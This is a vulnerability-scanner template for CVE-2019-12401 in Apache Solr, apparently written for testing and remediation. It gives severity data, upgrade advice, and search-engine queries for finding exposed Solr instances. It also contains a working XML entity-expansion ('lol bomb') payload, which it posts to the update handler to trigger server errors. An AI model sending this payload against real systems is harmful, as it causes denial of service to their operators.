id: CVE-2019-12401

info:
  name: Apache Solr XML Bomb DoS Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: Solr versions 1.3.0 to 1.4.1, 3.1.0 to 3.6.2 and 4.0.0 to 4.10.4 are vulnerable to an XML resource consumption attack (a.k.a. Lol Bomb) via its update handler.
  impact: |
    An attacker can exploit this vulnerability to exhaust system resources, leading to a denial of service.
  remediation: |
    Upgrade to Apache Solr version 8.2.0 or later to mitigate the vulnerability.
  reference:
    - http://www.openwall.com/lists/oss-security/2019/09/10/1
    - https://lists.apache.org/thread.html/048ae6e4f84a88e8856f766320b48ad91f9fca2c6f621aa2c40088fe%40%3Cdev.lucene.apache.org%3E
    - https://lists.apache.org/thread.html/0ec231c5ed8d242890e21806d25fdd47f80cc47cac278d2fc1c9c579%40%3Cdev.lucene.apache.org%3E
    - https://lists.apache.org/thread.html/1c92300643f48f13bc59b15e3f886ba62bae1798c7d4c2e5c1ece09b%40%3Cannounce.apache.org%3E
    - https://lists.apache.org/thread.html/521d10a19bfb590f86dff41820ccfb11e92281f233a12c882650931e%40%3Cdev.lucene.apache.org%3E
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2019-12401
    cwe-id: CWE-776
    epss-score: 0.00234
    epss-percentile: 0.6214
    cpe: cpe:2.3:a:apache:solr:*:*:*:*:*:*:*:*
  metadata:
    vendor: apache
    product: solr
    shodan-query: http.title:"Solr Admin"
    fofa-query:
      - body="apache solr"
      - title="apache solr"
      - title="solr admin"
      - title="solr"
    google-query:
      - intitle:"apache solr"
      - intitle:"solr admin"
      - intitle:"solr"

http:
  - method: POST
    path:
      - "{{BaseURL}}/solr/collection1/update?wt=json"

    headers:
      Content-Type: "application/xml"

    body: "<!DOCTYPE data [\n<!ENTITY lol \"lol\">\n<!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\"> \n<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"> \n<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"> \n<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\"> \n<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n<!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]>\n<add>\n<doc>\n<field name=\"id\">&lol9;</field>\n<field name=\"title\">change.me</field>\n</doc>\n</add>\n"
    matchers:
      - type: status
        status:
          - 500
          - 502
          - 503
